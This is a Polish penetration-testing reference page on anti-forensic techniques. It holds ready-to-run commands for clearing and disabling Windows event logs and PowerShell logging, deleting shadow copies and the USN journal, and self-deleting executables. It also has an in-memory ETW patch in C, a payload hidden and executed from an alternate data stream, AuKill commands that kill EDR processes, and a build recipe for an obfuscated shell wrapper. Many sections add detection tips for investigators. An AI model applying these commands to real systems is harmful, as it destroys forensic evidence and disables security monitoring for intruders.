# Techniki antyforensyczne

{{#include ../../banners/hacktricks-training.md}}

## Znaczniki czasu

Atakujący może chcieć **zmienić znaczniki czasu plików**, aby uniknąć wykrycia.\
Znaczniki czasu można znaleźć w MFT, w atrybutach `$STANDARD_INFORMATION` \_\_ oraz \_\_ `$FILE_NAME`.

Oba atrybuty zawierają 4 znaczniki czasu: **modyfikacji**, **dostępu**, **utworzenia** i **modyfikacji wpisu MFT** (MACE lub MACB).

**Eksplorator Windows** i inne narzędzia wyświetlają informacje z **`$STANDARD_INFORMATION`**.

### TimeStomp — narzędzie antyforensyczne

To narzędzie **modyfikuje** informacje o znacznikach czasu w **`$STANDARD_INFORMATION`**, **ale nie** informacje w **`$FILE_NAME`**. Dlatego można **zidentyfikować** **podejrzaną** **aktywność**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) to funkcja NTFS (systemu plików Windows NT), która śledzi zmiany na woluminie. Narzędzie [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) umożliwia analizę tych zmian.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal) to funkcja NTFS (systemu plików Windows NT), która śledzi zmiany na woluminie. ...](<../../images/image (801).png>)

Na poprzednim obrazie widać **wynik** działania **narzędzia**, który pokazuje, że w pliku **wprowadzono pewne zmiany**.

### $LogFile

**Wszystkie zmiany metadanych w systemie plików są rejestrowane** w procesie znanym jako [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Zarejestrowane metadane są przechowywane w pliku o nazwie `**$LogFile**`, znajdującym się w katalogu głównym systemu plików NTFS. Do analizowania tego pliku i identyfikowania zmian można użyć narzędzi takich jak [LogFileParser](https://github.com/jschicht/LogFileParser).

![Usnjrnl - $LogFile: Wszystkie zmiany metadanych w systemie plików są rejestrowane w procesie znanym jako write-ahead logging. Zarejestrowane metadane są przechowywane w pliku o nazwie $LogFile, znajdującym się w katalogu głównym...](<../../images/image (137).png>)

Ponownie, w wynikach działania narzędzia widać, że **wprowadzono pewne zmiany**.

Za pomocą tego samego narzędzia można ustalić, **na jaki czas zmieniono znaczniki czasu**:

![Usnjrnl - $LogFile: Za pomocą tego samego narzędzia można ustalić, na jaki czas zmieniono znaczniki czasu](<../../images/image (1089).png>)

- CTIME: czas utworzenia pliku
- ATIME: czas modyfikacji pliku
- MTIME: czas modyfikacji wpisu MFT pliku
- RTIME: czas dostępu do pliku

### Porównanie `$STANDARD_INFORMATION` i `$FILE_NAME`

Innym sposobem identyfikacji podejrzanie zmodyfikowanych plików jest porównanie czasu w obu atrybutach i wyszukanie **niezgodności**.

### Nanosekundy

Znaczniki czasu **NTFS** mają **precyzję** **100 nanosekund**. Dlatego znalezienie plików ze znacznikami czasu takimi jak 2010-10-10 10:10:**00.000:0000 jest bardzo podejrzane**.

### SetMace — narzędzie antyforensyczne

To narzędzie może modyfikować oba atrybuty: `$STARNDAR_INFORMATION` i `$FILE_NAME`. Jednak od Windows Vista do modyfikacji tych informacji wymagany jest działający system operacyjny.

## Ukrywanie danych

NTFS używa klastrów i minimalnego rozmiaru informacji. Oznacza to, że jeśli plik zajmuje półtora klastra, **pozostała połowa nigdy nie zostanie wykorzystana**, dopóki plik nie zostanie usunięty. Można więc **ukryć dane w tej niewykorzystanej przestrzeni**.

Istnieją narzędzia, takie jak slacker, które umożliwiają ukrywanie danych w tej „ukrytej” przestrzeni. Analiza `$logfile` i `$usnjrnl` może jednak ujawnić, że dodano tam dane:

![SetMace - Anti-forensic Tool - Ukrywanie danych: Istnieją narzędzia, takie jak slacker, które umożliwiają ukrywanie danych w tej „ukrytej” przestrzeni. Analiza $logfile i $usnjrnl może jednak ujawnić, że...](<../../images/image (1060).png>)

Następnie można odzyskać niewykorzystaną przestrzeń za pomocą narzędzi takich jak FTK Imager. Pamiętaj, że tego rodzaju narzędzia mogą zapisywać zawartość w formie zaciemnionej lub nawet zaszyfrowanej.

## UsbKill

To narzędzie **wyłącza komputer po wykryciu jakiejkolwiek zmiany w portach USB**.\
Można je wykryć, sprawdzając uruchomione procesy i **analizując każdy uruchomiony skrypt Pythona**.

## Dystrybucje Live Linux

Te dystrybucje są **uruchamiane w pamięci RAM**. Można je wykryć tylko wtedy, **gdy system plików NTFS jest zamontowany z uprawnieniami do zapisu**. Jeśli jest zamontowany tylko z uprawnieniami do odczytu, wykrycie włamania będzie niemożliwe.

## Bezpieczne usuwanie

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Opóźnione samousuwanie w Windows

Uruchomiony obraz Windows może być zablokowany, gdy jego proces jest aktywny. Proces może zlecić usunięcie procesowi potomnemu `cmd.exe`, użyć `choice` jako timera i zakończyć działanie, zanim powłoka wykona `del`. Opóźnienie pozwala pierwotnemu procesowi zwolnić uchwyt do obrazu; jeśli pełna ścieżka zawiera spacje, należy ująć ją w cudzysłowy.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Gdy ten ciąg jest przekazywany bezpośrednio jako argument do `cmd.exe`, a nie wpisywany w innym interaktywnym wierszu polecenia `cmd`, użyj `&` zamiast `^&` oraz `>nul` zamiast `^>nul`. Usuwa to wpis katalogu; **nie jest to bezpieczne wymazywanie** i nie usuwa śladów wykonania, zadań, dziennika systemu plików ani innych śladów kryminalistycznych. Wyszukuj krótkotrwałe procesy potomne `cmd.exe`, których wiersz polecenia łączy `choice /T`, `Del` i ścieżkę obrazu procesu nadrzędnego.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Konfiguracja Windows

Można wyłączyć kilka metod rejestrowania zdarzeń w systemie Windows, aby znacznie utrudnić dochodzenie kryminalistyczne.

### Wyłączanie znaczników czasu — UserAssist

To klucz rejestru przechowujący daty i godziny uruchomienia poszczególnych plików wykonywalnych przez użytkownika.

Wyłączenie UserAssist wymaga dwóch kroków:

1. Ustaw oba klucze rejestru: `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` i `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` na zero, aby wskazać, że chcemy wyłączyć UserAssist.
2. Wyczyść poddrzewa rejestru o nazwach podobnych do `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Wyłączanie znaczników czasu — Prefetch

Ta funkcja zapisuje informacje o uruchomionych aplikacjach, aby poprawić wydajność systemu Windows. Może być jednak również przydatna w dochodzeniach kryminalistycznych.

- Uruchom `regedit`
- Wybierz ścieżkę pliku `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Kliknij prawym przyciskiem myszy `EnablePrefetcher` oraz `EnableSuperfetch`
- Dla każdego z nich wybierz opcję Modify, aby zmienić wartość z 1 (lub 3) na 0
- Uruchom ponownie komputer

### Wyłączanie znaczników czasu — Last Access Time

Za każdym razem, gdy folder na woluminie NTFS zostaje otwarty na serwerze Windows NT, system **aktualizuje pole znacznika czasu w każdym wyświetlonym folderze** — jest to czas ostatniego dostępu. Na intensywnie używanym woluminie NTFS może to wpływać na wydajność.

1. Otwórz Edytor rejestru (Regedit.exe).
2. Przejdź do `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Znajdź `NtfsDisableLastAccessUpdate`. Jeśli nie istnieje, dodaj ten DWORD i ustaw jego wartość na 1, aby wyłączyć ten proces.
4. Zamknij Edytor rejestru i uruchom ponownie serwer.

### Usuwanie historii USB

Wszystkie **wpisy urządzeń USB** są przechowywane w rejestrze systemu Windows, pod kluczem **USBSTOR**, który zawiera podklucze tworzone za każdym razem, gdy podłączasz urządzenie USB do komputera PC lub laptopa. Ten klucz znajdziesz tutaj: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Usunięcie go** spowoduje skasowanie historii USB.\
Możesz również użyć narzędzia [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), aby upewnić się, że zostały usunięte (i je usunąć).

Innym plikiem zapisującym informacje o urządzeniach USB jest `setupapi.dev.log` w folderze `C:\Windows\INF`. Ten plik również należy usunąć.

### Wyłączanie kopii w tle

**Wyświetl** kopie w tle za pomocą `vssadmin list shadowstorage`\
**Usuń** je, uruchamiając `vssadmin delete shadow`

Możesz też usunąć je przez GUI, wykonując kroki opisane na stronie [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Aby wyłączyć kopie w tle, wykonaj [kroki opisane tutaj](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Otwórz program Usługi, wpisując „services” w polu wyszukiwania tekstowego po kliknięciu przycisku Start systemu Windows.
2. Znajdź na liście „Volume Shadow Copy”, zaznacz tę pozycję, a następnie otwórz Właściwości, klikając ją prawym przyciskiem myszy.
3. Z listy rozwijanej „Typ uruchomienia” wybierz opcję Disabled, a następnie zatwierdź zmianę, klikając Apply i OK.

Można też zmienić w rejestrze konfigurację plików kopiowanych w ramach kopii w tle: `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Nadpisywanie usuniętych plików

- Możesz użyć **narzędzia systemu Windows**: `cipher /w:C`. Poleci ono programowi cipher usunąć wszystkie dane z dostępnego, nieużywanego miejsca na dysku C.
- Możesz też użyć narzędzi takich jak [**Eraser**](https://eraser.heidi.ie)

### Usuwanie dzienników zdarzeń systemu Windows

- Windows + R --> eventvwr.msc --> Rozwiń „Dzienniki systemu Windows” --> Kliknij prawym przyciskiem myszy każdą kategorię i wybierz „Wyczyść dziennik”
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Wyłączanie dzienników zdarzeń systemu Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- W sekcji usług wyłącz usługę „Windows Event Log”
- `WEvtUtil.exec clear-log` lub `WEvtUtil.exe cl`

### Wyłączanie $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Zaawansowane rejestrowanie i manipulowanie śladami (2023–2025)

### Rejestrowanie PowerShell ScriptBlock/Module

Nowsze wersje Windows 10/11 i Windows Server przechowują **obszerne artefakty kryminalistyczne PowerShell** w dzienniku
`Microsoft-Windows-PowerShell/Operational` (zdarzenia 4104/4105/4106).  
Atakujący mogą wyłączyć lub wyczyścić je w locie:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Obrońcy powinni monitorować zmiany tych kluczy rejestru oraz masowe usuwanie zdarzeń PowerShell.

### ETW (Event Tracing for Windows) Patch

Produkty bezpieczeństwa endpointów w dużym stopniu polegają na ETW. Popularna metoda omijania zabezpieczeń z 2024 roku polega na patchowaniu w pamięci `ntdll!EtwEventWrite`/`EtwEventWriteFull`, aby każde wywołanie ETW zwracało `STATUS_SUCCESS` bez emitowania zdarzenia:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Publiczne PoC (np. `EtwTiSwallow`) implementują tę samą prymitywę w PowerShellu lub C++.  
Ponieważ patch jest **lokalny dla procesu**, EDR-y działające w innych procesach mogą go nie wykryć.<sup>[[5]](#references)</sup>
Wykrywanie: porównaj `ntdll` w pamięci z wersją na dysku lub załóż hook przed przejściem do user-mode.

### Powrót Alternate Data Streams (ADS)

W kampaniach malware z 2023 roku (np. loaderach **FIN12**) zaobserwowano umieszczanie binariów drugiego etapu w ADS, aby pozostały poza zasięgiem tradycyjnych skanerów:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Wylicz strumienie za pomocą `dir /R`, `Get-Item -Stream *` lub Sysinternals `streams64.exe`.
Skopiowanie pliku hosta na FAT/exFAT lub przez SMB usunie ukryty strumień i może pomóc
śledczym odzyskać payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver jest obecnie rutynowo wykorzystywane do **antykryminalistyki** podczas
ataków ransomware.  
Narzędzie open source **AuKill** ładuje podpisany, ale podatny sterownik (`procexp152.sys`), aby
zawiesić lub zakończyć działanie EDR i czujników kryminalistycznych **przed szyfrowaniem i niszczeniem logów**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Sterownik jest następnie usuwany, pozostawiając minimalną ilość śladów.<sup>[[1]](#references)</sup>  
Środki zaradcze: włącz listę blokowania podatnych sterowników Microsoft (HVCI/SAC)
i monitoruj tworzenie usług jądra z lokalizacji zapisywalnych przez użytkowników.

---

## Linux Anti-Forensics: samodzielne patchowanie i Cloud C2 (2023–2025)

### Samodzielne patchowanie zaatakowanych usług w celu ograniczenia wykrywania (Linux)
Przeciwnicy coraz częściej „samodzielnie patchują” usługę zaraz po jej wykorzystaniu, aby zapobiec ponownemu wykorzystaniu luki i ograniczyć wykrywanie oparte na podatnościach. Polega to na zastąpieniu podatnych komponentów najnowszymi, legalnymi plikami binarnymi/JAR-ami upstream, dzięki czemu skanery zgłaszają, że host jest załatany, a persistence i C2 pozostają aktywne.<sup>[[3]](#references)</sup>

Przykład: RCE w Apache ActiveMQ OpenWire (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Po uzyskaniu dostępu atakujący pobierali legalne JAR-y z Maven Central (repo1.maven.org), usuwali podatne JAR-y z instalacji ActiveMQ i ponownie uruchamiali broker.
- Zamknęło to początkową lukę RCE, pozostawiając inne punkty zaczepienia (cron, zmiany konfiguracji SSH, oddzielne implanty C2).

Przykład operacyjny (ilustracyjny)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Wskazówki dotyczące analizy forensic i threat huntingu
- Sprawdź katalogi usług pod kątem nieplanowanych podmian plików binarnych/JAR:
  - Debian/Ubuntu: `dpkg -V activemq` i porównaj hashe/ścieżki plików z mirrorami repozytorium.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Szukaj wersji JAR-ów obecnych na dysku, których nie śledzi menedżer pakietów, lub dowiązań symbolicznych zmienionych poza standardowym procesem.
- Oś czasu: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` — skoreluj ctime/mtime z okresem naruszenia.
- Historia powłoki/telemetria procesów: ślady użycia `curl`/`wget` do `repo1.maven.org` lub innych CDN-ów z artefaktami tuż po początkowym wykorzystaniu podatności.
- Zarządzanie zmianami: ustal, kto i dlaczego zastosował „łatkę”, a nie tylko potwierdź obecność załatanej wersji.

### C2 w usługach chmurowych z tokenami bearer i stagerami utrudniającymi analizę
Zaobserwowane techniki łączyły wiele ścieżek długotrwałego C2 z pakowaniem utrudniającym analizę:<sup>[[3]](#references)</sup>
- Zabezpieczone hasłem loadery ELF utworzone za pomocą PyInstaller, utrudniające sandboxing i analizę statyczną (np. zaszyfrowany PYZ, tymczasowe rozpakowywanie w `/_MEI*`).
  - Wskaźniki: wyniki `strings`, takie jak `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Artefakty środowiska uruchomieniowego: rozpakowywanie do `/tmp/_MEI*` lub niestandardowych ścieżek `--runtime-tmpdir`.
- C2 oparty na Dropbox z użyciem zahardkodowanych tokenów OAuth Bearer
  - Wskaźniki sieciowe: `api.dropboxapi.com` / `content.dropboxapi.com` z `Authorization: Bearer <token>`.
  - Szukaj w proxy/NetFlow/Zeek/Suricata wychodzącego ruchu HTTPS do domen Dropbox z obciążeń serwerowych, które zwykle nie synchronizują plików.
- Równoległy/zapasowy C2 przez tunelowanie (np. Cloudflare Tunnel `cloudflared`), zapewniający kontrolę w razie zablokowania jednego kanału.
  - Wskaźniki na hoście: procesy/jednostki `cloudflared`, konfiguracja w `~/.cloudflared/*.json`, wychodzące połączenia na port 443 do węzłów brzegowych Cloudflare.

### Utrzymywanie dostępu przez mechanizmy trwałości i „cofanie hardeningu” (przykłady dla Linuxa)
Atakujący często łączą samodzielne patchowanie z trwałymi metodami uzyskiwania dostępu:<sup>[[3]](#references)</sup>
- Cron/Anacron: modyfikacje pliku zastępczego `0anacron` w każdym katalogu `/etc/cron.*/` w celu okresowego uruchamiania.
  - Szukaj:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Cofanie utwardzania konfiguracji SSH: włączanie logowania roota i zmienianie domyślnych powłok kont o niskich uprawnieniach.
  - Szukaj śladów włączenia logowania roota:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Szukaj podejrzanych powłok interaktywnych na kontach systemowych (np. `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Losowe artefakty beaconów o krótkich nazwach (8 liter), zapisywane na dysku, które dodatkowo łączą się z cloud C2:
  - Szukaj:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Obrońcy powinni korelować te artefakty z ekspozycją zewnętrzną i zdarzeniami instalowania poprawek usług, aby wykrywać samonaprawianie antyforensyczne stosowane do ukrycia początkowego wykorzystania luki.

## Statyczne wykonywanie osadzonej powłoki

Wrapper skryptowy z osadzonym interpreterem i implementacjami poleceń może wykonywać obsługiwane operacje powłoki wewnątrz jednego pliku wykonywalnego, zamiast uruchamiać `/bin/sh` i osobne procesy narzędzi. HimitsuShell tworzy taki statyczny plik binarny z musl. W przeciwieństwie do [wrapperów SHc](../../linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.md), wbudowane polecenia nie muszą uruchamiać powłoki systemowej ani osobnego procesu narzędzia. Nieobsługiwane polecenia mogą być przekazywane do powłoki systemowej.<sup>[[9]](#references)</sup>

Ogranicza to widoczność procesów powłoki i procesów potomnych `execve`.<sup>[[9]](#references)</sup> Proces wrappera i jego wywołania systemowe pozostają widoczne za pośrednictwem punktów śledzenia jądra, dlatego twierdzenia projektu o niewidoczności nawet dla śledzenia jądra nie należy traktować dosłownie.<sup>[[9]](#references)[[11]](#references)</sup>

W przypadku udokumentowanej kompilacji x86_64 pozostaw plik wejściowy o nazwie `launcher.sh` i skopiuj go do kontenera przed kompilacją. Plik wynikowy to `safeLauncher`:<sup>[[9]](#references)</sup>

```bash
curl -LO https://github.com/HimitsuShell/Himitsu/releases/download/v2.1.0/himitsu_core_x86_64_linux_musl.tar.gz
docker load -i himitsu_core_x86_64_linux_musl.tar.gz
docker run --name himitsu_core -d -it himitsu_core
docker cp launcher.sh himitsu_core:/var/work/
docker exec himitsu_core /var/work/compile.sh
docker cp himitsu_core:/var/work/safeLauncher .
```

Publiczny skrypt `compile.sh` szyfruje skrypt za pomocą AES-256-CTR, szyfruje wartość czasu wygaśnięcia oraz klucze i wektory IV używane pośrednio za pomocą AES-256-CBC, konwertuje zaszyfrowane pliki na tablice C przy użyciu `xxd -i`, a następnie łączy je z `lib.bc` za pomocą `-static -s`. Końcowy klucz szyfrujący i wektor IV są również osadzone, więc rozwiązanie to utrudnia pobieżną analizę statyczną, ale nie zapewnia sekretu, którego nie da się odzyskać.<sup>[[10]](#references)</sup>

Domyślne passy LLVM to `-sobf` i `-sub`. Przed kompilacją edytuj `/var/work/compile.sh`, aby włączyć udokumentowane alternatywy, takie jak spłaszczanie przepływu sterowania (`fla`) lub fałszywy przepływ sterowania (`bcf`).<sup>[[9]](#references)[[10]](#references)</sup>

Przed poleganiem na tym wrapperze sprawdź zgodność skryptów: projekt obsługuje składnię powłoki POSIX, ostrzega, że skrypty Bash/Zsh mogą nie działać, i informuje, że polecenia spoza wbudowanego zestawu są uruchamiane przez powłokę systemową.<sup>[[9]](#references)</sup>

Analizę spłaszczonego przepływu sterowania opisano w artykule [omijanie spłaszczonego przepływu sterowania za pomocą wąskiego wycinka wykonania](../../reversing/reversing-tools-basic-methods/#bypass-flattened-control-flow-with-a-narrow-execution-slice).

{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Sophos X-Ops – AuKill: uzbrojony, podatny sterownik służący do wyłączania EDR (marzec 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patchowanie EtwEventWrite w celu zachowania skrytości: wykrywanie i analiza zagrożeń (czerwiec 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patchowanie w celu utrzymania dostępu: jak złośliwe oprogramowanie DripDropper dla systemu Linux rozprzestrzenia się w chmurze](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE w Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Ukrywanie .NET – ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Odkrycie wariantu SectopRAT osadzonego w legalnym oprogramowaniu](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – polecenie choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – polecenie del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
- [9] [README HimitsuShell](https://github.com/HimitsuShell/HimitsuShell)
- [10] [Skrypt kompilacji HimitsuShell](https://github.com/HimitsuShell/HimitsuShell/blob/main/inside_container/compile.sh)
- [11] [Histogramy zdarzeń jądra systemu Linux i śledzenie wywołań systemowych](https://docs.kernel.org/trace/histogram.html)
